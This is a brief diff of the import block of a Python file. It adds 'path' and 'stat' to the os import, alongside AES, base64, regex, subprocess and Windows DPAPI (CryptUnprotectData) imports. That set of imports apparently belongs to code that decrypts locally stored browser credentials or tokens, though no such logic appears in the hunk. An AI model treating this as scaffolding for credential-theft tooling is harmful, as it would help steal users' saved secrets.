@@ -1,7 +1,7 @@
 from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-from os import getlogin, listdir
+from os import getlogin, listdir, path, stat
 from json import loads
 from re import findall
 from subprocess import Popen
